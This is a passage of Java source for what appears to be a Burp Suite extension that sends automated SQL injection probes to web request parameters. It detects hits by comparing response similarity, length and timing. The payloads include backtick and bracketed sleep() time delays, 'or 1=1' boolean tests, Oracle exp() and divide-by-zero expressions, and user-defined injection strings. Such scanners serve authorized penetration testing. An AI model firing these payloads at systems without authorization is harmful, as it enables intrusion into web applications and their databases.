                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse poc2Resp = poc2Result.response();
                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
                    if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;

                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
                            poc2Req.url().toString(),
                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
                    paramEntries.add(poc2Entry);
                    commaEntries.add(poc2Entry);

                    if (poc2Ok) {
                        String poc1Body = poc1Resp.bodyToString();
                        String poc2Body = poc2Resp.bodyToString();
                        double simBasePoc2 = jaccardSimilarity(baseBody, poc2Body);
                        double simPoc1Poc2 = jaccardSimilarity(poc1Body, poc2Body);
                        boolean step2Ok = simBasePoc2 < 0.90;
                        boolean compareOk = simPoc1Poc2 > 0.90;
                        appendLog(String.format("  逗号测试 [%s] poc2=value,XXXXXX sim(base,poc2)=%.4f sim(poc1,poc2)=%.4f step2=%s compare=%s",
                                key, simBasePoc2, simPoc1Poc2, step2Ok, compareOk));

                        if (step2Ok && compareOk) {
                            boolean poc3OrPoc4Hit = false;
                            String parenCompareBody = null;
                            String parenPayloadSuffix = null;

                            {
                                String poc3Value = value + ",1";
                                HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
                                long t3 = System.currentTimeMillis();
                                HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
                                long cost3 = System.currentTimeMillis() - t3;
                                sentRequests++;
                                if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                                HttpResponse poc3Resp = poc3Result.response();
                                boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
                                if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;

                                int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
                                HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
                                LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
                                        poc3Req.url().toString(),
                                        key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
                                paramEntries.add(poc3Entry);
                                commaEntries.add(poc3Entry);

                                if (poc3Ok) {
                                    String poc3Body = poc3Resp.bodyToString();
                                    double simBasePoc3 = jaccardSimilarity(baseBody, poc3Body);
                                    double simPoc1Poc3 = jaccardSimilarity(poc1Body, poc3Body);
                                    boolean poc3Hit = simBasePoc3 > 0.90 && simPoc1Poc3 < 0.90;
                                    appendLog(String.format("  逗号测试 [%s] poc3=value,1 sim(base,poc3)=%.4f sim(poc1,poc3)=%.4f result=%s",
                                            key, simBasePoc3, simPoc1Poc3, poc3Hit));
                                    if (poc3Hit) {
                                        poc3OrPoc4Hit = true;
                                        parenCompareBody = poc3Body;
                                        parenPayloadSuffix = ",(1)";
                                    }
                                }
                            }

                            if (!poc3OrPoc4Hit) {
                                String poc4Value = value + ",2";
                                HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
                                long t4 = System.currentTimeMillis();
                                HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
                                long cost4 = System.currentTimeMillis() - t4;
                                sentRequests++;
                                if (cost4 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                                HttpResponse poc4Resp = poc4Result.response();
                                boolean poc4Ok = (poc4Resp != null && poc4Resp.statusCode() >= 200 && poc4Resp.statusCode() < 300);
                                if (poc4Ok && cost4 < quickBaselineCost) quickBaselineCost = cost4;

                                int code4 = poc4Ok ? poc4Resp.statusCode() : 0;
                                HttpRequestResponse poc4Display = buildDisplayMessage(poc4Req, poc4Result);
                                LogEntry poc4Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc4Display,
                                        poc4Req.url().toString(),
                                        key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
                                paramEntries.add(poc4Entry);
                                commaEntries.add(poc4Entry);

                                if (poc4Ok) {
                                    String poc4Body = poc4Resp.bodyToString();
                                    double simBasePoc4 = jaccardSimilarity(baseBody, poc4Body);
                                    double simPoc1Poc4 = jaccardSimilarity(poc1Body, poc4Body);
                                    boolean poc4Hit = simBasePoc4 > 0.90 && simPoc1Poc4 < 0.90;
                                    appendLog(String.format("  逗号测试 [%s] poc4=value,2 sim(base,poc4)=%.4f sim(poc1,poc4)=%.4f result=%s",
                                            key, simBasePoc4, simPoc1Poc4, poc4Hit));
                                    if (poc4Hit) {
                                        poc3OrPoc4Hit = true;
                                        parenCompareBody = poc4Body;
                                        parenPayloadSuffix = ",(2)";
                                    }
                                }
                            }

                            if (poc3OrPoc4Hit && parenCompareBody != null) {
                                String parenValue = value + parenPayloadSuffix;
                                HttpRequest parenReq = buildMutatedRequest(req, target, parenValue);
                                long tparen = System.currentTimeMillis();
                                HttpRequestResponse parenResult = sendRequestWithInterval(parenReq);
                                long costParen = System.currentTimeMillis() - tparen;
                                sentRequests++;
                                if (costParen > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                                HttpResponse parenResp = parenResult.response();
                                boolean parenOk = (parenResp != null && parenResp.statusCode() >= 200 && parenResp.statusCode() < 300);
                                if (parenOk && costParen < quickBaselineCost) quickBaselineCost = costParen;

                                int codeParen = parenOk ? parenResp.statusCode() : 0;
                                HttpRequestResponse parenDisplay = buildDisplayMessage(parenReq, parenResult);
                                LogEntry parenEntry = addDetailEntry(new LogEntry(count.get(), toolFlag, parenDisplay,
                                        parenReq.url().toString(),
                                        key, parenValue, "", requestMd5, (int) costParen, "end", codeParen, false));
                                paramEntries.add(parenEntry);
                                commaEntries.add(parenEntry);

                                double simParen = 0.0;
                                if (parenOk) {
                                    simParen = jaccardSimilarity(parenCompareBody, parenResp.bodyToString());
                                }
                                appendLog(String.format("  逗号测试 [%s] paren=%s sim(paren,compare)=%.4f result=%s",
                                        key, parenValue, simParen, simParen > 0.90));
                                poc3OrPoc4Hit = simParen > 0.90;
                            }

                            commaVuln = poc3OrPoc4Hit;
                        }
                    }
                }
            }
            if (commaVuln) {
                stopAfterCurrentRule = true;
            }

            boolean expVuln = false;
            boolean divVuln = false;
            boolean sleepVuln = false;
            boolean backtickVuln = false;
            boolean fuzzyVuln = false;

            // 反引号注入检测：
            // poc1: value`                    -> 与原始响应体长度差 > 10
            // poc2: value`and+sleep(2)--+     -> 与原始响应时间差 > 2s 且 < 4s
            // poc3: value`and+sleep(5)--+     -> 与原始响应时间差 > 4s 且 < 6s (命中)
            if (!stopAfterCurrentRule) {
                int baseLen = baseRespLen;
                long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;

                String poc1Value = value + "`";
                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
                long t1 = System.currentTimeMillis();
                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
                long cost1 = System.currentTimeMillis() - t1;
                sentRequests++;
                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                HttpResponse poc1Resp = poc1Result.response();
                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;

                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
                        poc1Req.url().toString(),
                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
                paramEntries.add(poc1Entry);
                backtickEntries.add(poc1Entry);

                int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
                int lenDiff = Math.abs(poc1Len - baseLen);
                boolean poc1Hit = poc1Ok && lenDiff > 10;
                appendLog(String.format("  反引号测试 [%s] poc1=value` len(base=%d, poc1=%d, diff=%d) result=%s",
                        key, baseLen, poc1Len, lenDiff, poc1Hit));

                if (poc1Hit) {
                    String poc2Value = value + "`and+sleep(2)--+";
                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
                    long t2 = System.currentTimeMillis();
                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
                    long cost2 = System.currentTimeMillis() - t2;
                    sentRequests++;
                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse poc2Resp = poc2Result.response();
                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);

                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
                            poc2Req.url().toString(),
                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
                    paramEntries.add(poc2Entry);
                    backtickEntries.add(poc2Entry);

                    long diff2 = cost2 - baseCostMs;
                    boolean poc2Hit = poc2Ok && diff2 > 2000 && diff2 < 4000;
                    appendLog(String.format("  反引号测试 [%s] poc2=value`and+sleep(2)--+ cost(base=%dms, poc2=%dms, diff=%dms) result=%s",
                            key, baseCostMs, cost2, diff2, poc2Hit));

                    if (poc2Hit) {
                        String poc3Value = value + "`and+sleep(5)--+";
                        HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
                        long t3 = System.currentTimeMillis();
                        HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
                        long cost3 = System.currentTimeMillis() - t3;
                        sentRequests++;
                        if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                        HttpResponse poc3Resp = poc3Result.response();
                        boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);

                        int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
                        HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
                        LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
                                poc3Req.url().toString(),
                                key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
                        paramEntries.add(poc3Entry);
                        backtickEntries.add(poc3Entry);

                        long diff3 = cost3 - baseCostMs;
                        backtickVuln = poc3Ok && diff3 > 4000 && diff3 < 6000;
                        appendLog(String.format("  反引号测试 [%s] poc3=value`and+sleep(5)--+ cost(base=%dms, poc3=%dms, diff=%dms) result=%s",
                                key, baseCostMs, cost3, diff3, backtickVuln));
                    }
                }
            }
            if (backtickVuln) {
                stopAfterCurrentRule = true;
            }

            // 模糊查询注入检测：
            // poc1: value'                  -> 与原始响应长度差异 > 10
            // poc2: value'+or+1=1--+        -> len(poc2) vs len(poc3) 差异 >= 10
            // poc3: value'+or+1=2--+
            // poc4: value'+or+1=3--+        -> len(poc3) vs len(poc4) 差异 <= 5
            if (!stopAfterCurrentRule) {
                String baseBody = resp.bodyToString();
                int baseLen = baseRespLen;

                String poc1Value = value + "'";
                HttpRequest poc1Req = buildMutatedRequest(req, target, poc1Value);
                long t1 = System.currentTimeMillis();
                HttpRequestResponse poc1Result = sendRequestWithInterval(poc1Req);
                long cost1 = System.currentTimeMillis() - t1;
                sentRequests++;
                if (cost1 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                HttpResponse poc1Resp = poc1Result.response();
                boolean poc1Ok = (poc1Resp != null && poc1Resp.statusCode() >= 200 && poc1Resp.statusCode() < 300);
                if (poc1Ok && cost1 < quickBaselineCost) quickBaselineCost = cost1;

                int code1 = poc1Ok ? poc1Resp.statusCode() : 0;
                HttpRequestResponse poc1Display = buildDisplayMessage(poc1Req, poc1Result);
                LogEntry poc1Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc1Display,
                        poc1Req.url().toString(),
                        key, poc1Value, "", requestMd5, (int) cost1, "end", code1, false));
                paramEntries.add(poc1Entry);
                fuzzyEntries.add(poc1Entry);

                int poc1Len = poc1Ok ? poc1Resp.body().length() : 0;
                int lenDiff = Math.abs(poc1Len - baseLen);
                boolean poc1Hit = poc1Ok && lenDiff > 10;
                appendLog(String.format("  模糊查询测试 [%s] poc1=value' len(base=%d, poc1=%d, diff=%d) result=%s",
                        key, baseLen, poc1Len, lenDiff, poc1Hit));

                if (poc1Hit) {
                    String poc2Value = value + "'+or+1=1--+";
                    HttpRequest poc2Req = buildMutatedRequest(req, target, poc2Value);
                    long t2 = System.currentTimeMillis();
                    HttpRequestResponse poc2Result = sendRequestWithInterval(poc2Req);
                    long cost2 = System.currentTimeMillis() - t2;
                    sentRequests++;
                    if (cost2 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse poc2Resp = poc2Result.response();
                    boolean poc2Ok = (poc2Resp != null && poc2Resp.statusCode() >= 200 && poc2Resp.statusCode() < 300);
                    if (poc2Ok && cost2 < quickBaselineCost) quickBaselineCost = cost2;

                    int poc2Len = poc2Ok ? poc2Resp.body().length() : 0;

                    int code2 = poc2Ok ? poc2Resp.statusCode() : 0;
                    HttpRequestResponse poc2Display = buildDisplayMessage(poc2Req, poc2Result);
                    LogEntry poc2Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc2Display,
                            poc2Req.url().toString(),
                            key, poc2Value, "", requestMd5, (int) cost2, "end", code2, false));
                    paramEntries.add(poc2Entry);
                    fuzzyEntries.add(poc2Entry);

                    {
                        String poc3Value = value + "'+or+1=2--+";
                        HttpRequest poc3Req = buildMutatedRequest(req, target, poc3Value);
                        long t3 = System.currentTimeMillis();
                        HttpRequestResponse poc3Result = sendRequestWithInterval(poc3Req);
                        long cost3 = System.currentTimeMillis() - t3;
                        sentRequests++;
                        if (cost3 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                        HttpResponse poc3Resp = poc3Result.response();
                        boolean poc3Ok = (poc3Resp != null && poc3Resp.statusCode() >= 200 && poc3Resp.statusCode() < 300);
                        if (poc3Ok && cost3 < quickBaselineCost) quickBaselineCost = cost3;

                        int poc3Len = poc3Ok ? poc3Resp.body().length() : 0;

                        int code3 = poc3Ok ? poc3Resp.statusCode() : 0;
                        HttpRequestResponse poc3Display = buildDisplayMessage(poc3Req, poc3Result);
                        LogEntry poc3Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc3Display,
                                poc3Req.url().toString(),
                                key, poc3Value, "", requestMd5, (int) cost3, "end", code3, false));
                        paramEntries.add(poc3Entry);
                        fuzzyEntries.add(poc3Entry);

                        {
                            String poc4Value = value + "'+or+1=3--+";
                            HttpRequest poc4Req = buildMutatedRequest(req, target, poc4Value);
                            long t4 = System.currentTimeMillis();
                            HttpRequestResponse poc4Result = sendRequestWithInterval(poc4Req);
                            long cost4 = System.currentTimeMillis() - t4;
                            sentRequests++;
                            if (cost4 > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                            HttpResponse poc4Resp = poc4Result.response();
                            boolean poc4Ok = (poc4Resp != null && poc4Resp.statusCode() >= 200 && poc4Resp.statusCode() < 300);
                            if (poc4Ok && cost4 < quickBaselineCost) quickBaselineCost = cost4;

                            int poc4Len = poc4Ok ? poc4Resp.body().length() : 0;

                            int code4 = poc4Ok ? poc4Resp.statusCode() : 0;
                            HttpRequestResponse poc4Display = buildDisplayMessage(poc4Req, poc4Result);
                            LogEntry poc4Entry = addDetailEntry(new LogEntry(count.get(), toolFlag, poc4Display,
                                    poc4Req.url().toString(),
                                    key, poc4Value, "", requestMd5, (int) cost4, "end", code4, false));
                            paramEntries.add(poc4Entry);
                            fuzzyEntries.add(poc4Entry);

                            int diffPoc2Poc3 = Math.abs(poc2Len - poc3Len);
                            int diffPoc3Poc4 = Math.abs(poc3Len - poc4Len);
                            if (poc2Ok && poc3Ok && poc4Ok) {
                                fuzzyVuln = diffPoc2Poc3 >= 10 && diffPoc3Poc4 <= 5;
                            }
                            appendLog(String.format("  模糊查询测试 [%s] len(poc2=%d, poc3=%d, poc4=%d) diff(p2,p3)=%d diff(p3,p4)=%d result=%s",
                                    key, poc2Len, poc3Len, poc4Len, diffPoc2Poc3, diffPoc3Poc4, fuzzyVuln));
                        }
                    }
                }
            }
            if (fuzzyVuln) {
                stopAfterCurrentRule = true;
            }

            // 报错注入检测（对四个 payload 的响应逐一检测）
            boolean errorVuln = false;
            String  errorSign = "";
            if (!stopAfterCurrentRule && !compiledErrorPatterns.isEmpty()) {
                outer:
                for (int qi = 0; qi < 4; qi++) {
                    if (quoteResults[qi] == null) continue;
                    HttpResponse qResp = quoteResults[qi].response();
                    if (qResp == null) continue;
                    String respBody = qResp.bodyToString();
                    String matchedPattern = findMatchedErrorPattern(respBody);
                    if (matchedPattern != null) {
                        String shortPat = matchedPattern.length() > 20 ? matchedPattern.substring(0, 20) + "..." : matchedPattern;
                        errorSign = "✔ 报错:" + shortPat;
                        errorVuln = true;
                        appendLog("【报错注入】参数:" + key
                                + " payload:" + value + quotePayloads[qi]
                                + " 匹配:" + matchedPattern);
                        break outer;
                    }
                }
            }
            if (errorVuln) {
                stopAfterCurrentRule = true;
            }

            // 规则命中后停止后续检测，但保留 div 检测
            {
                String[] divPayloads = {"'||1/0||'", "'||1/1||'"};
                int[] divLens = new int[2];
                for (int di = 0; di < 2; di++) {
                    String payloadValue = value + divPayloads[di];
                    HttpRequest divReq = buildMutatedRequest(req, target, payloadValue);
                    long t1 = System.currentTimeMillis();
                    HttpRequestResponse divResult = sendRequestWithInterval(divReq);
                    long cost = System.currentTimeMillis() - t1;
                    sentRequests++;
                    if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse divResp = divResult.response();
                    boolean divOk = (divResp != null && divResp.statusCode() >= 200 && divResp.statusCode() < 300);
                    if (divOk && cost < quickBaselineCost) quickBaselineCost = cost;
                    divLens[di] = divOk ? divResp.body().length() : 0;
                    int code = divOk ? divResp.statusCode() : 0;
                    HttpRequestResponse divDisplay = buildDisplayMessage(divReq, divResult);
                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, divDisplay,
                            divReq.url().toString(),
                            key, payloadValue, "", requestMd5, (int) cost, "end", code, false));
                    paramEntries.add(detail);
                    divEntries.add(detail);
                }
                boolean dCond1 = Math.abs(divLens[1] - baseRespLen) <= 10;
                boolean dCond2 = Math.abs(divLens[1] - divLens[0]) >= 10;
                divVuln = dCond1 && dCond2;
                appendLog(String.format("  除零测试 [%s] len(base=%d, 1/0=%d, 1/1=%d)",
                        key, baseRespLen, divLens[0], divLens[1]));
                if (divVuln) {
                    stopAfterCurrentRule = true;
                }
            }

            if (!stopAfterCurrentRule && !slowDetected) {
                // Oracle exp 检测：'||exp(200)||' / '||exp(11111)||' / '||exp(2222)||'
                String[] expPayloads = {"'||exp(200)||'", "'||exp(11111)||'", "'||exp(2222)||'"};
                int[] expLens = new int[3];
                HttpResponse[] expResponses = new HttpResponse[3];
                boolean[] expOkFlags = new boolean[3];
                for (int ei = 0; ei < 3; ei++) {
                    String payloadValue = value + expPayloads[ei];
                    HttpRequest expReq = buildMutatedRequest(req, target, payloadValue);
                    long t1 = System.currentTimeMillis();
                    HttpRequestResponse expResult = sendRequestWithInterval(expReq);
                    long cost = System.currentTimeMillis() - t1;
                    sentRequests++;
                    if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse expResp = expResult.response();
                    boolean expOk = (expResp != null && expResp.statusCode() >= 200 && expResp.statusCode() < 300);
                    expResponses[ei] = expResp;
                    expOkFlags[ei] = expOk;
                    if (expOk && cost < quickBaselineCost) quickBaselineCost = cost;
                    expLens[ei] = expOk ? expResp.body().length() : 0;
                    int code = expOk ? expResp.statusCode() : 0;
                    HttpRequestResponse expDisplay = buildDisplayMessage(expReq, expResult);
                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, expDisplay,
                            expReq.url().toString(),
                            key, payloadValue, "", requestMd5, (int) cost, "end", code, false));
                    paramEntries.add(detail);
                    expEntries.add(detail);
                }
                boolean eCond1 = Math.abs(expLens[0] - baseRespLen) <= 15;
                boolean eCond2 = Math.abs(expLens[1] - expLens[0]) >= 15;
                double simExp2222Exp11111 = 0.0;
                boolean eCond3 = false;
                if (expOkFlags[1] && expOkFlags[2]) {
                    simExp2222Exp11111 = textSimilarity(expResponses[2].bodyToString(), expResponses[1].bodyToString());
                    eCond3 = simExp2222Exp11111 > 0.90;
                }
                expVuln = eCond1 && eCond2 && eCond3;
                appendLog(String.format("  exp测试 [%s] len(base=%d, exp200=%d, exp11111=%d, exp2222=%d) sim(exp2222,exp11111)=%.4f",
                        key, baseRespLen, expLens[0], expLens[1], expLens[2], simExp2222Exp11111));
                if (expVuln) {
                    stopAfterCurrentRule = true;
                }

                // 括号模糊查询延时注入：
                // 1. value' 与 value'' 响应体长度差 <= 5
                // 2. value')+and+sleep(5)--+ 与原始请求时间差 >= 5000ms
                // 3. value')+and+sleep(5)--+ 比 value')+and+sleep(2)--+ 慢 >= 2000ms
                if (!stopAfterCurrentRule) {
                    boolean quoteLenClose = Math.abs(len1 - len2) <= 5;
                    String sleep5Payload = "')+and+sleep(5)--+";
                    String sleep5Value = value + sleep5Payload;
                    HttpRequest sleepReq = buildMutatedRequest(req, target, sleep5Value);
                    long t1 = System.currentTimeMillis();
                    HttpRequestResponse sleepResult = sendRequestWithInterval(sleepReq);
                    long sleep5Cost = System.currentTimeMillis() - t1;
                    sentRequests++;
                    if (sleep5Cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse sleepResp = sleepResult.response();
                    boolean sleepOk = (sleepResp != null && sleepResp.statusCode() >= 200 && sleepResp.statusCode() < 300);
                    int code = sleepOk ? sleepResp.statusCode() : 0;
                    HttpRequestResponse sleepDisplay = buildDisplayMessage(sleepReq, sleepResult);
                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, sleepDisplay,
                            sleepReq.url().toString(),
                            key, sleep5Value, "", requestMd5, (int) sleep5Cost, "end", code, false));
                    paramEntries.add(detail);
                    sleepEntries.add(detail);

                    String sleep2Payload = "')+and+sleep(2)--+";
                    String sleep2Value = value + sleep2Payload;
                    HttpRequest sleep2Req = buildMutatedRequest(req, target, sleep2Value);
                    long t2 = System.currentTimeMillis();
                    HttpRequestResponse sleep2Result = sendRequestWithInterval(sleep2Req);
                    long sleep2Cost = System.currentTimeMillis() - t2;
                    sentRequests++;
                    if (sleep2Cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;
                    HttpResponse sleep2Resp = sleep2Result.response();
                    boolean sleep2Ok = (sleep2Resp != null && sleep2Resp.statusCode() >= 200 && sleep2Resp.statusCode() < 300);
                    int sleep2Code = sleep2Ok ? sleep2Resp.statusCode() : 0;
                    HttpRequestResponse sleep2Display = buildDisplayMessage(sleep2Req, sleep2Result);
                    LogEntry sleep2Detail = addDetailEntry(new LogEntry(count.get(), toolFlag, sleep2Display,
                            sleep2Req.url().toString(),
                            key, sleep2Value, "", requestMd5, (int) sleep2Cost, "end", sleep2Code, false));
                    paramEntries.add(sleep2Detail);
                    sleepEntries.add(sleep2Detail);

                    long baseCostMs = (quickBaselineCost == Long.MAX_VALUE) ? 0 : quickBaselineCost;
                    long diffBaseMs = sleep5Cost - baseCostMs;
                    long diffSleepMs = sleep5Cost - sleep2Cost;
                    sleepVuln = quoteLenClose && diffBaseMs >= 5000 && diffSleepMs >= 2000;
                    appendLog(String.format("  括号延时测试 [%s] len(value'=%d, value''=%d, diff=%d) cost(base=%dms, sleep5=%dms, sleep2=%dms, diffBase=%dms, diffSleep=%dms) result=%s",
                            key, len1, len2, Math.abs(len1 - len2), baseCostMs, sleep5Cost, sleep2Cost, diffBaseMs, diffSleepMs, sleepVuln));
                }
            } else {
                appendLog(scanId + " 参数=" + key + " 已命中规则或请求偏慢，跳过 exp/sleep 检测");
            }

            // 自定义 payload 检测（附加 payload，独立发送）
            boolean diyVuln = false;
            String  diySign = "";
            if (!stopAfterCurrentRule && jTextAreaInt == 1) {
                for (String payload : jTextAreaData1.split("\n")) {
                    if (slowDetected) {
                        appendLog(scanId + " 参数=" + key + " 请求偏慢，跳过剩余diy payload");
                        break;
                    }
                    payload = payload.trim();
                    if (payload.isEmpty()) continue;

                    String useValue = (diyPayload2 == 1) ? "" : value;
                    HttpRequest diyReq;
                    long t1 = System.currentTimeMillis();
                    diyReq = buildMutatedRequest(req, target, useValue + payload);
                    HttpRequestResponse diyResult = sendRequestWithInterval(diyReq);
                    long cost = System.currentTimeMillis() - t1;
                    sentRequests++;
                    if (cost > SINGLE_REQUEST_SLOW_MS) slowDetected = true;

                    HttpResponse diyResp = diyResult.response();
                    boolean diyOk = (diyResp != null && diyResp.statusCode() >= 200 && diyResp.statusCode() < 300);
                    int code = diyOk ? diyResp.statusCode() : 0;
                    String diyChangeSign = "";

                    if (cost >= 3000) {
                        diyChangeSign = "time > 3s";
                        diyVuln = true;
                        diySign = diyChangeSign;
                        appendLog("【时间注入】参数:" + key + " payload:" + useValue + payload);
                    }

                    // 报错检测也对自定义 payload 生效
                    if (!diyVuln && !compiledErrorPatterns.isEmpty() && diyOk) {
                        String respBody = diyResp.bodyToString();
                        String matchedPattern = findMatchedErrorPattern(respBody);
                        if (matchedPattern != null) {
                            String shortPat = matchedPattern.length() > 20 ? matchedPattern.substring(0, 20) + "..." : matchedPattern;
                            diyChangeSign = "✔ 报错:" + shortPat;
                            diyVuln = true;
                            diySign = diyChangeSign;
                            appendLog("【报错注入-diy】参数:" + key
                                    + " payload:" + useValue + payload
                                    + " 匹配:" + matchedPattern);
                        }
                    }

                    HttpRequestResponse diyDisplay = buildDisplayMessage(diyReq, diyResult);
                    LogEntry detail = addDetailEntry(new LogEntry(count.get(), toolFlag, diyDisplay,
                            diyReq.url().toString(),
                            key, useValue + payload, diyChangeSign, requestMd5, (int) cost, "end", code, false));
                    paramEntries.add(detail);
                    diyEntries.add(detail);
                }
                if (diyVuln) {
                    stopAfterCurrentRule = true;
                }
            }

            // ── 汇总当前参数结论 ────────────────────────────
            boolean paramVuln = quoteVuln || numVuln || commaVuln || fuzzyVuln || backtickVuln || expVuln || divVuln || sleepVuln || errorVuln || diyVuln;
            List<String> triggeredSigns = new ArrayList<>();
            if (quoteVuln) {
                triggeredSigns.add("✔ 单引号拼接注入");
                appendLog(String.format("【单引号拼接注入】参数:%s  条件: ①|%d-%d|<=5 ②|%d-%d|<=5 ③|%d-%d|>5",
                        key, len2, len4, len1, len3, len1, len2));
            }
            if (numVuln) {
                triggeredSigns.add("✔ 数字型注入");
                appendLog("【数字型注入】参数:" + key + " 触发 value-0-0-0/value-abc 相似度规则");
            }
            if (commaVuln) {
                triggeredSigns.add("✔ order注入");
                appendLog("【order注入】参数:" + key + " 触发逗号四步 Jaccard 规则");
            }
            if (fuzzyVuln) {
                triggeredSigns.add("✔ 模糊查询注入");
                appendLog("【模糊查询注入】参数:" + key + " 触发 value' -> or 1=1 -> or 1=2 规则");
            }
            if (backtickVuln) {
                triggeredSigns.add("✔ 反引号注入");
                appendLog("【反引号注入】参数:" + key + " 触发 value` -> sleep(2) -> sleep(5) 时间规则");
            }
            if (expVuln) {
                triggeredSigns.add("✔ 表达式注入(exp)");
                appendLog("【表达式注入】参数:" + key + " 触发 exp(200)/exp(11111) 规则");
            }
            if (divVuln) {
                triggeredSigns.add("✔ 表达式注入(除零)");
                appendLog("【表达式注入】参数:" + key + " 触发 1/0 与 1/1 规则");
            }
            if (sleepVuln) {
                triggeredSigns.add("✔ 括号模糊查询延时注入");
                appendLog("【括号模糊查询延时注入】参数:" + key + " 触发 value' / value'' + sleep(5) 规则");
            }
            if (errorVuln) triggeredSigns.add(errorSign);
            if (diyVuln)   triggeredSigns.add(diySign);

            String paramSign = String.join(" | ", triggeredSigns);

            if (paramVuln) {
                changeSign1 = " ✔";
                anyVulnFound = true;
                appendLog("【疑似注入】URL:" + req.url() + " 参数:" + key + " 结论:" + paramSign);
            }

            if (paramVuln) {
                if (quoteVuln) markEntries(quoteEntries, "✔ 单引号拼接注入");
                if (numVuln) markEntries(numEntries, "✔ 数字型注入");
                if (commaVuln) markEntries(commaEntries, "✔ order注入");
                if (fuzzyVuln) markEntries(fuzzyEntries, "✔ 模糊查询注入");
                if (backtickVuln) markEntries(backtickEntries, "✔ 反引号注入");
                if (expVuln) markEntries(expEntries, "✔ 表达式注入(exp)");
                if (divVuln) markEntries(divEntries, "✔ 表达式注入(除零)");
                if (sleepVuln) markEntries(sleepEntries, "✔ 括号模糊查询延时注入");
                if (errorVuln) markEntries(quoteEntries, errorSign);
                if (diyVuln) markEntries(diyEntries, diySign);

                for (LogEntry entry : paramEntries) {
                    entry.isVulnRow = true;
                }
            }
        }

        // 更新主表该行状态
        final String sign = changeSign1;
        final boolean vuln = anyVulnFound;
        synchronized (log) {
            for (LogEntry entry : log) {
                if (requestMd5.equals(entry.dataMd5)) {
                    entry.state     = "end!" + sign;
                    entry.isVulnRow = vuln;
                }
            }
        }
        if (requestMd5.equals(dataMd5Id)) {
            requestDetailRefresh();
        }
        appendLog(scanId + " 检测完成 URL=" + req.url() + " 结果=" + (vuln ? "疑似注入" : "未命中"));
        SwingUtilities.invokeLater(this::fireTableDataChanged);
    }

    // =========================================================
    // 日志追加
    // =========================================================
    private void appendLog(String msg) {
        stdout.println(msg);
        if (logTextArea != null) {
            SwingUtilities.invokeLater(() -> {
                logTextArea.append(msg + "\n");
                logTextArea.setCaretPosition(logTextArea.getDocument().getLength());
            });
        }
    }

    private void refreshCompiledErrorPatterns() {
        List<Pattern> compiled = new ArrayList<>();
